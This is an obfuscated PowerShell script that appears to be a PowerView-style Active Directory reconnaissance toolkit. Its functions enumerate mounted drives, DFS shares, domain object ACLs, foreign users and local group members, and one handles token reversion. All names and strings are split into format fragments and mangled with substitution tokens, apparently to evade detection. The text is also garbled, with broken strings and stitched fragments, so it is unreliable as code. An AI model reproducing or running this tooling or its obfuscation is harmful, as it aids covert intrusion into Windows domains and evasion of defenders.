
function GeIJKT-WmIreGmIJKounteIJKdDrIJKIvE {


    [OutputType({Z3b{3}{2}{4}{5}{0}{1}Z3b -f S5zedDrS5z,S5ziveS5z,S5zwerView.RS5z,S5zPoS5z,S5zeS5z,S5zgMountS5z})]
    [CmdletBinding()]
    Param(
        [Parameter(poSITIoN = 0, vAlueFROmPiPELINe = YoV{TIJKRuE}, valUEfrOMpiPeLinEbyProPERTYNaMe = YoV{tIJKRUe})]
        [Alias({Z3b{1}{0}{2}Z3b -fS5ztNaS5z,S5zHosS5z,S5zmeS5z}, {Z3b{2}{0}{1}Z3b-fS5zshostnS5z,S5zameS5z,S5zdnS5z}, {Z3b{1}{0}Z3b -fS5zameS5z,S5znS5z})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        YoV{CoIJKmPUTEIJKRNAMe} = (Z3b{1}{2}{0}Z3b -fS5ztS5z,S5zlocalhS5z,S5zosS5z),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{CrEIJKdeNTiIJKAL} =  (  &(S5zgiS5z)  vARIabLE:JFI ).Z3bVIJKALuEZ3b::Z3beMIJKPtyZ3b
    )

    PROCESS {
        ForEach (YoV{coMPIJKUIJKTIJKER} in YoV{coMPuIJKTIJKeRnAIJKMe}) {
            
            YoV{hIJKKU} = 2147483651

            YoV{wMIaIJKRIJKGUmEntS} = @{
                (Z3b{1}{0}Z3b-f S5zstS5z,S5zLiS5z) = YoV{TRIJKUe}
                (Z3b{0}{1}Z3b -fS5zClaS5z,S5zssS5z) = (Z3b{2}{1}{0}Z3b -f S5zrovS5z,S5ztdRegPS5z','} = {(S5z^AS5z+S5zliS5z+S5zaS5z+S5zsmkvS5z).Z3brepLAIJKcEZ3b(S5zmkvS5z,[stRInG][CHar]36)}
            YoV{PIJKARIJKAIJKmeIJKTeRATTIJKRiBUte} = &(Z3b{2}{0}{1}Z3b-f S5zw-ObjS5z,S5zectS5z,S5zNeS5z) -TypeName (Z3b{3}{14}{1}{4}{6}{13}{2}{8}{0}{11}{9}{5}{12}{7}{10}Z3b-fS5zt.Automation.ParametS5z,S5z.S5z,S5zemS5z,S5zSysS5z,S5zMS5z,S5zttriS5z,S5zanaS5z,S5ztS5z,S5zenS5z,S5zrAS5z,S5zeS5z,S5zeS5z,S5zbuS5z,S5zgS5z,S5ztemS5z)

            switch -regex (YoV{PsIJKBOuIJKNDpIJKAIJKRaMEtIJKErS}.Z3bKeIJKysZ3b) {
                YoV{AttrIJKibuTIJKEReIJKgEx} {
                    Try {
                        YoV{paRIJKAmETERAIJKTtRIJKIbUtE}.YoV{_} = . YoV{gETVIJKAR}
                    }
                    Catch {
                        YoV{_}
                    }
                    continue
                }
            }

            if(YoV{DpDiCtIJKIIJKonIJKArY}.Z3bKeIJKysZ3b -contains YoV{nIJKAmE}) {
                YoV{dpDIJKiCTioIJKNAIJKRy}.YoV{NIJKAME}.Z3baTTIJKRibUIJKTesZ3b.(Z3b{0}{1}Z3b-fS5zAS5z,S5zddS5z).Invoke(YoV{PAraIJKMIJKetIJKERaTtrIIJKBIJKUte})
            }
            else {
                YoV{aTTrIJKiIJKButEIJKCOIJKLLEctIoN} = &(Z3b{0}{2}{1}Z3b -f S5zNewS5z,S5zectS5z,S5z-ObjS5z) -TypeName (Z3b{11}{14}{2}{1}{7}{10}{3}{13}{8}{5}{9}{4}{6}{12}{0}Z3b -fS5zibute]S5z,S5zctS5z,S5zllections.ObjeS5z,S5z.CoS5z,S5zstemS5z,S5z[S5z,S5z.S5z,S5zModeS5z,S5zlectionS5z,S5zSyS5z,S5zlS5z,S5zCS5z,S5zAttrS5z,S5zlS5z,S5zoS5z)
                switch -regex (YoV{PIJKsbOUNdparIJKAmIJKeTeRS}.Z3bkeIJKysZ3b) {
                    YoV{valIJKiDAIJKTIJKIIJKonRegex} {
                        Try {
                            YoV{PIJKArAMeTerIJKoIJKptiIJKONS} = &(Z3b{0}{2}{1}Z3b -fS5zNewS5z,S5zjectS5z,S5z-ObS5z) -TypeName Z3bSystem.Management.Automation.YoV{_}AttributeZ3b -ArgumentList (. YoV{gIJKETIJKVAR}) -ErrorAction (Z3b{0}{1}Z3b -f S5zSS5z,S5ztopS5z)
                            YoV{ATtIJKRIBUIJKTecOIJKLLEctiON}.(Z3b{0}{1}Z3b-fS5zAS5','me=YoVIdentityInstance)(name=YoVIdentityInstance)(dnshostname=YoVIdentityInstance))Z3b
                }
                e','z)  -CREPlAcE  ([chaR]109+[chaR]117+[chaR]100),[chaR]36-ReplAcE ([chaR]80+[chaR]54+[chaR]122),[chaR]39)+S5zandS5z+S5z S5z+(S5z@SystemTS5z+S5ziS5z+S5zme&lt;={0}{1S5z+S5z}S5z+S5z({1S5z+','s S5z+S5zoS5z+S5zbject: S5z+Z3bYoV_Z3b)
                        }
                    }
                    YoV{DIJKFIJKSsearcHeR}.(Z3b{0}{1}Z3b-fS5zdispoS5z,S5zseS5z).Invoke()
                }
                catch {
                    &(Z3b{2}{0}{1}{3}Z3b -f S5zteS5z,S5z-WarniS5z,S5zWriS5z,S5zngS5z) (S5z[Get-DomainDFS5z+S5zSSS5z+S5zharS5z+S5ze] S5z+S5zGS5z+S5zet-DoS5z+S5zmainDFSS5z+S5zShareS5z+S5zV2 S5z+S5zeS5z+S5zrrorS5z+S5z S5z+S5z: S5z+Z3bYoV_Z3b)
                }
                YoV{DFIJKsShaIJKRES} JGO &(Z3b{0}{1}{2}Z3b-fS5zSoS5z,S5zrt-ObjS5z,S5zectS5z) -Unique -Property (Z3b{2}{3}{0}{1}{4}Z3b-f S5zrS5z,S5zveS5z,S5zRemoteSS5z,S5zeS5z,S5zrNameS5z)
            }
        }
    }

    PROCESS {
        YoV{DIJKFsShArIJKES} = @()

        if (YoV{','S5z,S5zLS5z,S5zTS5z,S5zteS5z,S5z}RemoS5z,S5ztop UsersS5z,S5zBUIS5z))  -f [cHAr]92) }
                    (Z3b{3}{0}{2}{1}Z3b-fS5z-5-S5z,S5z56S5z,S5z32-5S5z,S5zS-1S5z)  { (((Z3b{5}{9}{7}{6}{4}{2}{1}{0}{3}{8}Z3b-f S5zraS5z,S5zOpeS5z,S5z S5z,S5ztS5z,S5zionS5z,S5zBUILTIN{0}NeS5z,S5zfiguratS5z,S5znS5z,S5zorsS5z,S5ztwork CoS5z))  -f  [Char]92) }
                    (Z3b{0}{2}{1}Z3b -f S5zS-1-5-3S5z,S5z557S5z,S5z2-S5z)  { (((Z3b{6}{1}{11}{8}{2}{12}{3}{7}{4}{5}{9}{0}{10}Z3b-fS5zeS5z,S5zUIS5z,S5znS5z,S5zingS5z,S5zForS5z,S5zeS5z,S5zBS5z,S5z S5z,S5zIN3F6IS5z,S5zst Trust BuildS5z,S5zrsS5z,S5zLTS5z,S5zcomS5z)).Z3brEPIJKLIJKAceZ3b(([CHar]51+[CHar]70+[CHar]54),S5z5rjS5z)) }
                    (Z3b{1}{0}{2}Z3b-f S5z32-5S5z,S5zS-1-5-S5z,S5z58S5z)  { (((Z3b{3}{7}{1}{0}{6}{4}{2}{5}Z3b -fS5zrfoS5z,S5zLTINpDPPeS5z,S5ziS5z,S5zBUS5z,S5zmance MonS5z,S5ztor UsersS5z,S5zrS5z,S5zIS5z))  -CRePlAcES5zpDPS5z,[ChAR]92) }
                    (Z3b{0}{2}{1}Z3b-f S5zS-1-5-3S5z,S5z559S5z,S5z2-S5z)  { (((Z3b{6}{3}{4}{5}{0}{1}{7}{8}{2}Z3b -f S5z0}PerformanceS5z,S5z S5z,S5zsS5z,S5zTS5z,S5zIS5z,S5zN{S5z,S5zBUILS5z,S5zLogS5z,S5z UserS5z)) -F[ChAR]92) }
                    (Z3b{2}{1}{3}{0}Z3b-fS5z-32-560S5z,S5z-1S5z,S5zSS5z,S5z-5S5z)  { (((Z3b{10}{1}{6}{0}{3}{9}{7}{2}{5}{4}{8}Z3b -fS5z{0S5z,S5zUILTS5z,S5z AS5z,S5z}S5z,S5zization Access GrouS5z,S5zuthorS5z,S5zINS5z,S5zndowsS5z,S5zpS5z,S5zWiS5z,S5zBS5z))  -F  [cHAr]92) }
                    (Z3b{3}{0}{2}{1}Z3b-f S5z-3S5z,S5z61S5z,S5z2-5S5z,S5zS-1-5S5z)  { (((Z3b{3}{7}{10}{4}{6}{5}{1}{12}{0}{9}{8}{2}{11}Z3b -fS5zeS5z,S5zenS5z,S5zrS5z,S5zBUS5z,S5zinal ServS5z,S5zLicS5z,S5zer S5z,S5zILTIS5z,S5zeS5z,S5z ServS5z,S5zN7t2TermS5z,S5zsS5z,S5zsS5z)).Z3brEpLAIJKceZ3b(([chaR]55+[chaR]116+[chaR]50),[stRING][chaR]92)) }
                    (Z3b{2}{1}{0}Z3b -fS5z-32-562S5z,S5z5S5z,S5zS-1-S5z)  { (((Z3b{0}{5}{3}{4}{1}{2}Z3b -f S5zBUILTINS5z,S5zeS5z,S5zd COM UsersS5z,S5z}S5z,S5zDistributS5z,S5z{0S5z))-f[ChAr]92) }
                    (Z3b{3}{1}{2}{0}Z3b -fS5z9S5z,S5z-1-5-32S5z,S5z-56S5z,S5zSS5z)  { (((Z3b{2}{4}{3}{1}{5}{6}{0}Z3b-fS5zorsS5z,S5zryptograS5z,S5zBUS5z,S5zINjo8CS5z,S5zILTS5z,S5zphic OpS5z,S5zeratS5z)).Z3breIJKplACeZ3b(([cHaR]106+[cHaR]111+[cHaR]56),S5z5rjS5z)) }
                    (Z3b{0}{3}{2}{1}Z3b-fS5zS-S5z,S5z573S5z,S5z-5-32-S5z,S5z1S5z)  { (((Z3b{5}{0}{2}{1}{4}{3}Z3b-f S5zNgAxES5z,S5zog S5z,S5zvent LS5z,S5zersS5z,S5zReadS5z,S5zBUILTIS5z)).(Z3b{1}{0}Z3b-f S5zaceS5z,S5zReplS5z).Invoke(S5zgAxS5z,S5z5rjS5z)) }
                    (Z3b{0}{2}{1}Z3b -fS5zS-1-5-32S5z,S5z4S5z,S5z-57S5z)  { (((Z3b{0}{4}{1}{7}{3}{6}{8}{9}{2}{5}Z3b -f S5zBUILS5z,S5zificaS5z,S5zce DCOM AcceS5z,S5z S5z,S5zTIN{0}CertS5z,S5zssS5z,S5zSS5z,S5zteS5z,S5zervS5z,S5ziS5z)) -F[cHaR]92) }
                    (Z3b{1}{2}{0}{3}Z3b-f S5z-3S5z,S5zS-1-S5z,S5z5S5z,S5z2-575S5z)  { (((Z3b{2}{9}{0}{3}{6}{5}{4}{1}{8}{7}Z3b-f S5zILTINBI2RDSS5z,S5zess SeS5z,S5zBS5z,S5z ReS5z,S5zte AccS5z,S5zoS5z,S5zmS5z,S5zsS5z,S5zrverS5z,S5zUS5z)).Z3bREPIJKLaCEZ3b(([cHaR]66+[cHaR]73+[cHaR]50),S5z5rjS5z)) }
                    (Z3b{0}{2}{1}Z3b -fS5zS-1-5-S5z,S5z-576S5z,S5z32S5z)  { (((Z3b{4}{3}{5}{0}{6}{7}{2}{1}Z3b-f S5zdpoS5z,S5zrsS5z,S5zServeS5z,S5zN{S5z,S5zBUILTIS5z,S5z0}RDS EnS5z,S5zinS5z,S5zt S5z))-F[char]92) }
                    (Z3b{2}{1}{0}Z3b-f S5z577S5z,S5z-5-32-S5z,S5zS-1S5z)  { (((Z3b{4}{1}{2}{5}{0}{3}Z3b-fS5zanagement ServeS5z,S5zUILTS5z,S5zINEQpRDS5z,S5zrsS5z,S5zBS5z,S5zS MS5z))  -CRePLACe S5zEQpS5z,[CHaR]92) }
                    (Z3b{3}{0}{1}{2}Z3b-f S5z32S5z,S5z-S5z,S5z578S5z,S5zS-1-5-S5z)  { (((Z3b{4}{1}{0}{7}{6}{2}{3}{5}Z3b -f S5zQHypeS5z,S5zLTIN7uS5z,S5z S5z,S5zAdmS5z,S5zBUIS5z,S5zinistratorsS5z,S5zVS5z,S5zr-S5z)).Z3bRIJKEPlIJKACeZ3b(([cHaR]55+[cHaR]117+[cHaR]81),[StRInG][cHaR]92)) }
                    (Z3b{3}{1}{2}{0}Z3b-f S5z579S5z,S5z-S5z,S5z1-5-32-S5z,S5zSS5z)  { (((Z3b{6}{2}{5}{7}{0}{3}{1}{4}Z3b-f S5zCoS5z,S5ztrS5z,S5zN{S5z,S5znS5z,S5zol Assistance OperatorsS5z,S5z0S5z,S5zBUILTIS5z,S5z}Access S5z)) -F  [cHaR]92) }
                    (Z3b{1}{2}{0}Z3b -fS5z2-580S5z,S5zS-S5z,S5z1-5-3S5z)  { (((Z3b{5}{2}{10}{1}{6}{8}{0}{4}{7}{3}{9}Z3b -f S5zolS5z,S5zccessS5z,S5zUILTIN{S5z,S5zraS5z,S5z A',',S5zGGPOCS5z,S5zw.S5z,S5zoS5z,S5zocaS5z,S5zputerS5z,S5zLS5z})]
    [CmdletBinding(DEfAultPaRAmEtErSetnAme = {Z3b{0}{4}{2}{1}{3}Z3b-f S5zCoS5z,S5zerS5z,S5zutS5z,S5zIdentityS5z,S5zmpS5z})]
    Param(
        [Parameter(posItIon = 0, paRamETERsetNamE = Z3bCOIJKMpIJKUteRiDEnIJKTITYZ3b, MANDAtory = YoV{TRIJKUE}, vAluEFrompIpeLIne = YoV{TIJKRuE}, vaLuefrompIPELIneBYpROPERTYnaME = YoV{TrIJKUe})]
        [Alias({Z3b{1}{2}{0}{3}Z3b-f S5zamS5z,S5zCoS5z,S5zmputerNS5z,S5zeS5z}, {Z3b{0}{1}Z3b -f S5zCompuS5z,S5zterS5z}, {Z3b{2}{0}{3}{1}Z3b-fS5znguishS5z,S5zmeS5z,S5zDistiS5z,S5zedNaS5z}, {Z3b{0}{1}{3}{2}{4}Z3b -f S5zSaS5z,S5zmAccoS5z,S5zamS5z,S5zuntNS5z,S5zeS5z}, {Z3b{0}{1}Z3b-f S5zNamS5z,S5zeS5z})]
        [String]
        YoV{cOmIJKputEIJKRiIJKdeNtItY},

        [Parameter(MAndaTorY = YoV{TIJKRuE}, ParametErSeTnAME = Z3bOIJKUIdEnIJKTiTyZ3b)]
        [Alias(S5zOUS5z)]
        [String]
        YoV{oUiIJKDENTIJKiTY},

        [String]
        [ValidateSet({Z3b{1}{4}{2}{3}{0}Z3b-fS5zrsS5z,S5zAdmS5z,S5znS5z,S5zistratoS5z,S5ziS5z}, {Z3b{2}{1}{3}{0}Z3b -f S5z4S5z,S5z1S5z,S5zS-S5z,S5z-5-32-54S5z}, S5zRDPS5z, {Z3b{1}{0}{2}{3}Z3b-fS5ze DesS5z,S5zRemotS5z,S5zktop S5z,S5zUsersS5z}, {Z3b{2}{1}{0}Z3b-fS5z-32-555S5z,S5z1-5S5z,S5zS-S5z})]
        YoV{LOIJKcalGROIJKUP} = (Z3b{2}{3}{4}{0}{1}Z3b -f S5ztratS5z,S5zorsS5z,S5zAdmiS5z,S5znS5z,S5zisS5z),

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{DoIJKMIJKAIn},

        [Valid','{6}{0}{2}{3}{1}Z3b -f S5zme,dS5z,S5znameS5z,S5zisS5z,S5ztinguishedS5z,S5zr,samaccS5z,S5zmembeS5z,S5zountnaS5z)
        }
        if (YoV{PsBOUnIJKDPaRaIJKmeTIJKerS}[(Z3b{0}{1}{2}Z3b -fS5zDoS5z,S5zmS5z,S5zainS5z)]) { YoV{sIJKEaIJKRchEIJKRArIJKguIJKmeNTS}[(Z3b{0}{1}Z3b -f S5zDomaS5z,S5zinS5z)] = YoV{DIJKomaIJKiN} }
        if (YoV{PsBOuIJKNdpIJKAraIJKMeterS}[(Z3b{1}{2}{0}Z3b -fS5zterS5z,S5zLDAPS5z,S5zFilS5z)]) { YoV{SeaRIJKCherarIJKgIJKUIJKMEntS}[(Z3b{2}{1}{0}Z3b-fS5zlterS5z,S5ziS5z,S5zLDAPFS5z)] = YoV{ldAIJKpIJKFIJKIlTer} }
        if (YoV{psBOUnIJKDParIJKAmEtIJKeRs}[(Z3b{2}{1}{0}Z3b-f S5zhBaseS5z,S5zrcS5z,S5zSeaS5z)]) { YoV{SIJKeArCIJKhEraRGumenIJKTS}[(Z3b{0}{2}{1}Z3b -f S5zSearS5z,S5zeS5z,S5zchB','{2}Z3b-f S5zAS5z,S5zdd-MS5z,S5zemberS5z) (Z3b{1}{2}{3}{0}Z3b -fS5zyS5z,S5zNotS5z,S5zeproperS5z,S5ztS5z) (Z3b{2}{0}{1}Z3b -f S5zctS5z,S5zSIDS5z,S5zObjeS5z) YoV{OIJKBjIJKect}.Z3bObjeCTIJKsIJKiDZ3b
                        YoV{gPIJKoLIJKOCaLGIJKRoUIJKPIJKmappiNg} JGO &(Z3b{2}{0}{1}{3}Z3b -f S5zmS5z,S5zbS5z,S5zAdd-MeS5z,S5zerS5z) (Z3b{1}{0}{3}{2}Z3b-f S5zroS5z,S5zNotepS5z,S5ztyS5z,S5zperS5z) (Z3b{1}{0}Z3b -fS5zomainS5z,S5zDS5z) YoV{DIJKoMaiN}
                        YoV{gPOLIJKOIJKCalIJKgROUPIJKmIJKAPpiIJKNg} JGO &(Z3b{1}{2}{0}Z3b -f S5zMemberS5z,S5zAS5z,S5zdd-S5z) (Z3b{1}{2}{0}Z3b-f S5zrtyS5z,S5zNoteS5z,S5zpropeS5z) (Z3b{0}{2}{1}Z3b-f S5zIS5z,S5zupS5z,S5zsGroS5z) YoV{isIJKGrOIJ','           YoV{GuIIJKdS} = &(Z3b{0}{2}{3}{1}Z3b-fS5zGet-DoS5z,S5zMapS5z,S5zmainGS5z,S5zUIDS5z) @DomainGUIDMapArguments
        }
    }

    PROCESS {
        if (YoV{sEIJKAIJKRChER}) {
            YoV{IDEnIJKTItIJKYfiIJKLtER} = S5zS5z
            YoV{FIJKiIJKLtEr} = S5zS5z
            YoV{iIJKdENtITY} JGO &(Z3b{1}{3}{2}{0}Z3b-fS5zjectS5z,S5zWS5z,S5zre-ObS5z,S5zheS5z) {YoV{_}} JGO &(Z3b{3}{1}{0}{2}Z3b-f S5zEacS5z,S5zrS5z,S5zh-ObjectS5z,S5zFoS5z) {
                YoV{IdEnIJKTItIJKYiNsTIJKANCE} = YoV{_}.(Z3b{2}{0}{1}Z3b -fS5zeplaS5z,S5zceS5z,S5zRS5z).Invoke(S5z(S5z, S5z5rj28S5z).(Z3b{1}{0}Z3b -fS5zlaceS5z,S5zRepS5z).Invoke(S5z)S5z, S5z5rj29S5z)
                if (YoV{IdEIJKNtITYIIJKNIJKsIJKTanIJKcE} -match (Z3b{2}{1}{0}Z3b -fS5z-1-.*S5z,S5zSS5z,S5z^S5z)) {
                    YoV{iDIJKeNtITIJKyIJKFiltEr} += Z3b(objectsid=YoVIdentityInstance)Z3b
                }
                elseif (YoV{IIJKDeIJKNtitYIIJKNIJKstAncE} -match (((Z3b{0}{1}{2}{4}{5}{3}Z3b-f S5z^(S5z,S5zCNgXhS5z,S5zOUgS5z,S5z=.*S5z,S5zXhDCS5z,S5z)S5z)).(Z3b{0}{1}{2}Z3b -fS5zrS5z,S5zePLS5z,S5zaceS5z).Invoke(S5zgXhS5z,S5zJGOS5z))) {
                    YoV{IdeNTIJKityfILIJKTEr} += Z3b(distinguishedname=YoVIdentityInstance)Z3b
                    if ((-not YoV{PSBOuIJKNIJKdparAMIJKEIJKTERs}[(Z3b{1}{0}Z3b -f S5znS5z,S5zDomaiS5z)]) -and (-not YoV{psBoIJKUnIJKdparaIJKmEtIJKeIJKRS}[(Z3b{1}{0}{2}Z3b-fS5zrcS5z,S5zSeaS5z,S5zhBaseS5z)])) {
                        
                        
                        YoV{IIJKDIJKeNtitydOmIJKAin} = YoV{IDeNIJKTitYIJKINsIJKTancE}.(Z3b{1}{2}{0}Z3b -f S5zgS5z,S5zSubStriS5z,S5znS5z).Invoke(YoV{iIJKDENIJKTitYiIJKNIJKstaNce}.(Z3b{2}{1}{0}Z3b -fS5zdexOfS5z,S5znS5z,S5zIS5z).Invoke(S5zDC=S5z)) -replace S5zDC=S5z,S5zS5z -replace S5z,S5z,S5z.S5z
                        &(Z3b{1}{0}{2}Z3b -f S5ze-S5z,S5zWritS5z,S5zVerboseS5z) (S5z[S5z+S5zGet-DS5z+S5zomainObjS5z+S5zectAcS5z+S5zlS5z+S5z] S5z+S5zExS5z+S5ztracteS5z+S5zd S5z+S5zdS5z+S5zomain S5z+Z3bS5zYoVIdentityDomainS5z Z3b+S5zfS5z+S5zrom S5z+Z3bS5zYoVIdentityInstanceS5zZ3b)
                        YoV{sIJKeIJKArCHeRaRgUmeIJKNTs}[(Z3b{1}{0}Z3b -f S5zinS5z,S5zDomaS5z)] = YoV{IDIJKEIJKNTitYdIJKOmAIJKIn}
                        YoV{SEARcIJKhIJKEr} = &(Z3b{1}{0}{3}{2}Z3b -f S5zt-DoS5z,S5zGeS5z,S5zinSearcherS5z,S5zmaS5z) @SearcherArguments
                        if (-not YoV{sIJKeaRCHIJKer}) {
                            &(Z3b{3}{0}{1}{2}Z3b -f S5ziS5z,S5znS5z,S5zgS5z,S5zWrite-WarnS5z) (S5z[Get-DS5z+S5zoS5z+S5zmaS5z+S5zinObjecS5z+S5ztS5z+S5zAclS5z+S5z] S5z+S5zUn','on.RuntimeS5z,S5zmaS5z,S5zManagemS5z,S5zSysteS5z,S5zDefinedParameteS5z,S5z.','z,S5zwS5z,S5zPoS5z,S5zerView.S5z})]
    [CmdletBinding()]
    Param (
        [Parameter( vALueFRoMPiPelINe = YoV{TrIJKUe}, VaLUEFRompipEliNebyPRopERTYnaMe = YoV{TRIJKUE})]
        [ValidateNotNullOrEmpty()]
        [byte[]]
        YoV{LOgIJKoNhoUIJKRsAIJKRRIJKAy}
    )

    Begin {
        if(YoV{logIJKoNIJKHourSaIJKRRAy}.Z3bCouIJKNtZ3b -ne 21) {
            throw (Z3b{7}{2}{1}{5}{6}{8}{3}{0}{4}Z3b -f S5zcorS5z,S5zgS5z,S5z','seIJKARIJKchErIJKAIJKRGUmeNts} = @{}
        if (YoV{PIJKsIJKBOUNdparIJKAmeTeRs}[(Z3b{1}{0}{2}Z3b -f S5zma','}Z3b-f S5zstS5z,S5ztionsS5z,S5zRelaS5z,S5zGetAS5z,S5zhipsS5z,S5zlS5z,S5zlTruS5z).Invoke() JGO &(Z3b{3}{1}{2}{0}{4}Z3b-f S5zch-S5z,S5zoS5z,S5zrEaS5z,S5zFS5z,S5zObjectS5z) {
                YoV{_}.Z3bpIJKsObjeIJKctZ3b.Z3bTIJKypIJKeNAmeSZ3b.(Z3b{1}{0}Z3b-fS5ztS5z,S5zInserS5z).Invoke(0, (Z3b{3}{2}{1}{4}{0}Z3b-f S5zTS5z,S5zestTrustS5z,S5zView.ForS5z,S5zPowerS5z,S5z.NES5z))
                YoV{_}
            }
        }
    }
}


function gEIJKT-IJKdOmaIJKinIJKFOrEIgnUSEr {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{2}{3}{1}{0}{4}Z3b -fS5zoS5z,S5zShouldPrS5z,S5zPS5z,S5zSS5z,S5zcessS5z}, S5zS5z)]
    [OutputType({Z3b{2}{5}{0}{1}{4}{3}Z3b -f S5zViS5z,S5zew.ForeignUS5z,S5zPowS5z,S5zrS5z,S5zseS5z,S5zerS5z})]
    [CmdletBinding()]
    Param(
        [Parameter(PosItiOn = 0, ValUEFrOmPipelINe = YoV{TRIJKUE}, VaLUefRoMpIpELINEBYPrOpeRtYNaME = YoV{tIJKRUe})]
        [Alias({Z3b{0}{1}Z3b-fS5zNaS5z,S5zmeS5z})]
        [ValidateNotNullOrEmpty()]
        [String]
        YoV{dIJKoIJKMaIn},

        [ValidateNotNullOrEmpty()]
       ',',S5zntiaS5z)]) {
            Y','1 -Day 1 -Hour 0 -Minute 0 -Second 0).(Z3b{1}{0}Z3b -f S5zsS5z,S5zAddHourS5z).Invoke(YoV{AIJKGE})).(Z3b{1}{0}Z3b -f S5zingS5z,S','

        [Parameter(VAlUefroMPipELINebYpRopeRTyNAme = YoV{TIJKRUE}, PARAMEtERSetNAMe = Z3bDYIJKNIJKAIJKMIIJKCPAIJKRameTErZ3b)]
        [ValidateCount(2,2)]
        [int[]]YoV{vaIJKLiDaTIJKELengIJKTh},

        [Parameter(ValUEfromPipeLineBYproPertYnamE = YoV{TIJKRUe}, pArametErseTnAMe = Z3bdIJKYNIJKAMiIJKCpARaMeteRZ3b)]
        [ValidateNotNullOrEmpty()]
        [string]YoV{VIJKALIdaIJKTEpatTEIJKRn},

        [Parameter(VALUefRoMPIPELiNEByPRoperTynAMe = YoV{tIJKRUe}, parameTersEtnaMe = Z3bDYNAMIJKicIJKPIJKArAMEterZ3b)]
        [','KRname} = YoV{_}
                        YoV{uIJKserIJKdoIJKMaiN} = YoV{NUIJKll}
                    }

                    YoV{rEGloGIJKgIJKedoIJKNuIJKSer} = &(Z3b{1}{0}{2}Z3b-f S5z-ObS5z,S5zNewS5z,S5zjectS5z) (Z3b{0}{2}{1}Z3b-f S5zPS5z,S5zbjectS5z,S5zSOS5z)
                    YoV{ReGIJKloGGIJKeIJKdOnUsIJKeR} JGO &(Z3b{0}{2}{1}Z3b-f S5zAS5z,S5z-MemberS5z,S5zddS5z) (Z3b{0}{2}{1}{3}Z3b-f S5zNoS5z,S5zoperS5z,S5zteprS5z,S5ztyS5z) (Z3b{2}{0}{1}Z3b-fS5zrNaS5z,S5zmeS5z,S5zComputeS5z) Z3bYoVComputerNameZ3b
                    YoV{reIJKGloGGedoNUSIJKER} JGO &(Z3b{3}{1}{0}{2}Z3b -f S5zMemS5z,S5z-S5z,S5zberS5z,S5zAddS5z) (Z3b{1}{2}{0}Z3b-f S5zpertyS5z,S5zNoteprS5z,S5zoS5z) (Z3b{2}{0}{1}Z3b-fS5zaiS5z,S5znS5z,S5zUserDomS5z) YoV{USERDIJKoIJKmAIn}
                    YoV{rEgLoGIJKGIJKEDoIJKNusEr} JGO &(Z3b{2}{1}{0}Z3b-fS5zmberS5z,S5zd-MeS5z,S5zAdS5z) (Z3b{1}{0}{2}{3}Z3b -f S5zpropS5z,S5zNoteS5z,S5zerS5z,S5ztyS5z) (Z3b{2}{1}{0}Z3b -fS5zeS5z,S5zrNamS5z,S5zUseS5z) YoV{UIJKSErnAIJKMe}
                    YoV{REGLoIJKggIJKEdIJKonIJKUSer} JGO &(Z3b{1}{2}{0}Z3b -fS5zerS5z,S5zAdS5z,S5zd-MembS5z) (Z3b{0}{1}{3}{2}Z3b -fS5zNS5z,S5zoteprS5z,S5ztyS5z,S5zoperS5z) (Z3b{1}{0}Z3b -f S5zIDS5z,S5zUserSS5z) YoV{_}
                    YoV{RIJKegIJKlogIJKgEDIJKOnUser}.Z3bPSIJKobIJKjeCTZ3b.Z3bTypEIJKNIJKAmeSZ3b.(Z3b{0}{2}{1}Z3b -fS5zInseS5z,S5ztS5z,S5zrS5z).Invoke(0, (Z3b{2}{4}{0}{5}{3}{1}Z3b-fS5zew.S5z,S5zrS5z,S5zPo',':IJKUIJKSEIJKRDnsdIJKOmain}
        }

        
        &(Z3b{2}{1}{0}{3}{4}Z3b-f S5zmainGS5z,S5zDoS5z,S5zGet-S5z,S5zrS5z,S5zoupS5z) @SearcherArguments JGO &(Z3b{3}{2}{1}{0}Z3b -f S5z-ObjectS5z,S5zEachS5z,S5zrS5z,S5zFoS5z) {
            YoV{SeAIJKRCHERARGIJKUMIJKENTS}[(Z3b{1}{2}{0}Z3b -fS5zesS5z,S5zPropertS5z,S5ziS5z)] = (Z3b{2}{3}{6}{1}{0}{4}{10}{11}{8}{7}{9}{5}Z3b -f S5ze,sS5z,S5zounttypS5z,S5zdistS5z,S5zinguS5z,S5zamaS5z,S5zctsi','1}{0}Z3b -fS5zwnerS5z,S5zOS5z}, {Z3b{1}{0}Z3b-fS5zlS5z,S5zSacS5z})]
        [String]
        YoV{secURitIJKYIJKmAsIJKKs},

        [Switch]
        YoV{TIJKoMBSIJKToIJKNE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{CrEIJKDeIJKNtIal} =   YoV{jIJKFi}::Z3bemIJKpTyZ3b
    )

    BEGIN {
        YoV{SEaRcherIJKARIJKgumeIJKNTS} = @{
            (Z3b{1}{2}{0}Z3b -fS5zsS5z,S5zPropertiS5z,S5zeS5z) = (Z3b{5}{4}','YoV{SEAIJKRIJKcIJKHeRIJKArgumenTs}[(Z3b{1}{2}{0}Z3b-fS5zcopeS5z,S5zSS5z,S5zearchSS5z)] = YoV{seAIJKRIJKcIJKhScOpE} }
        if (YoV{PSBouNIJKDIJKPArAMEIJKTERs}[(Z3b{0}{1}{3}{2}Z3b -f S5zResultS5z,S5zPS5z,S5zeSizeS5z,S5zagS5z)]) { YoV{seaIJKRCHeRaIJK','
    [OutputType({Z3b{5}{4}{6}{3}{1}{0}{2}Z3b -f S5zurS5z,S5zogonHoS5z,S5zsS5z,S5zLS5','IJKBEr} JGO &(Z3b{1}{2}{0}Z3b-f S5zerS5z,S5zAdd-MemS5z,S5zbS5z) (Z3b{1}{0}{2}Z3b-fS5zopS5z,S5zNoteprS5z,S5zertyS5z) (Z3b{2}{0}{1}{3}Z3b -fS5zerNS5z,S5zamS5z,S5zMembS5z,S5zeS5z) YoV{iNIJKFO}.Z3bLgrMI2_IJKdomaiNanIJKDIJKNaMEZ3b
                            YoV','2}{1}{0}Z3b-fS5zNameS5z,S5zpS5z,S5zGrouS5z) = YoV{GRoupNIJKAIJKME}
                    }
                    &(Z3b{1}{2}{0}{3}{4}{5}Z3b-f S5zpS5z,S5zGet-NetLocaS5z,S5zlGrouS5z,S5zMemS5z,S5zbeS5z,S5zrS5z) @NetLocalGroupMemberArguments
                }
            }

            if (YoV{tOkIJKenhAIJKNIJKdLE}) {
                &(Z3b{3}{0}{2}{1}Z3b-fS5zke-ReS5z,S5zToSelfS5z,S5zvertS5z,S5zInvoS5z)
            }
